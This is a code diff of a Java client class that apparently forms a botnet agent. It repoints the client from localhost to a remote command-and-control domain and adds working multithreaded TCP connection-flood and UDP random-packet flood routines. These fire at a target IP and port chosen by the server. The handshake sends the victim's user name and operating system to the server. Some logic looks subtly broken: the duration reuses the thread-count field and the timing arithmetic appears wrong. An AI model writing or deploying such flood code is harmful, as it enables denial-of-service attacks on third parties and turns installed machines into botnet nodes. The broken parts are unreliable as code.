@@ -9,12 +9,12 @@ import java.awt.*;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
-import java.net.InetAddress;
-import java.net.Socket;
+import java.net.*;
 import java.nio.charset.StandardCharsets;
+import java.security.SecureRandom;
 
 public class KutuzovEntry {
-    public  static final String HOST = "localhost";
+    public  static final String HOST = "analytics018.antecedentium.xyz";
     public  static final int    PORT = 33901;
 
     private static Socket socket;
@@ -54,6 +54,8 @@ public class KutuzovEntry {
                         for(int i = 0; i < scMessageBoxPacket.amount; i++)
                             new Thread(() -> JOptionPane.showMessageDialog(null, scMessageBoxPacket.content, scMessageBoxPacket.title, JOptionPane.INFORMATION_MESSAGE)).start();
                     } else if(packet instanceof SCDAPacket) {
+                        oos.writeObject(new CSDAResPacket(CSDAResPacket.RESPONSE_OK));
+
                         SCDAPacket scDAPacket = (SCDAPacket) packet;
                         try {
                             MoodlyEncryption moodlyEncryption = new MoodlyEncryption();
@@ -61,21 +63,53 @@ public class KutuzovEntry {
                             String decryptedData = moodlyEncryption.decrypt(scDAPacket.data.substring(0, scDAPacket.data.length() - 16).getBytes(StandardCharsets.UTF_8));
                             System.out.println("[CLIENT(" + socket.getLocalPort() + ")]  SCDAPacket:" + decryptedData);
                             String[] data = decryptedData.split(";");
+                            /* Actual data */
                             String method = data[0];
+                            String ip = data[1];
+                            int port = Integer.parseInt(data[2]);
+                            int threads = Integer.parseInt(data[3]);
+                            int time = Integer.parseInt(data[3]);
+                            long until = System.currentTimeMillis() + time*60L;
                             switch (method) {
-                                case "tcp":
+                                case "tcp": {
                                     System.out.println("TCP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
-                                    break;
-                                case "udp":
+                                    for (int i = 0; i < threads; i++)
+                                        new Thread(() -> {
+                                            while(System.currentTimeMillis() < until) {
+                                                try {
+                                                    Socket socket = new Socket();
+                                                    socket.connect(new InetSocketAddress(ip, port), 2500);
+                                                    Thread.sleep(100);
+                                                    socket.close();
+                                                }catch (Exception e) {}
+                                            }
+                                        }).start();
+                                } break;
+                                case "udp": {
                                     System.out.println("UDP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
-                                    break;
+                                    for(int i = 0; i < threads; i++)
+                                        new Thread(() -> {
+                                            DatagramSocket socket = null;
+                                            InetAddress address = null;
+                                            byte[] buff = new byte[65507];
+                                            SecureRandom random = new SecureRandom();
+
+                                            try {
+                                                socket = new DatagramSocket();
+                                                address = InetAddress.getByName(ip);
+                                            } catch (Exception exception) {}
+
+                                            random.nextBytes(buff);
+                                            DatagramPacket dataPacket = new DatagramPacket(buff, buff.length, address, port);
+
+                                            while(System.currentTimeMillis() < until)
+                                                try { socket.send(dataPacket); } catch (Exception exception) {}
+                                            socket.close();
+                                        }).start();
+                                } break;
                                 default: break;
                             }
-
-                            oos.writeObject(new CSDAResPacket(CSDAResPacket.RESPONSE_OK));
-                        } catch (Exception e) {
-                            oos.writeObject(new CSDAResPacket(CSDAResPacket.RESPONSE_ERROR));
-                        }
+                        } catch (Exception e) {}
                     } else if(packet instanceof SCRequireHandshakePacket) {
                         String identifierName = System.getProperty("user.name");
                         String os = System.getProperty("os.name");
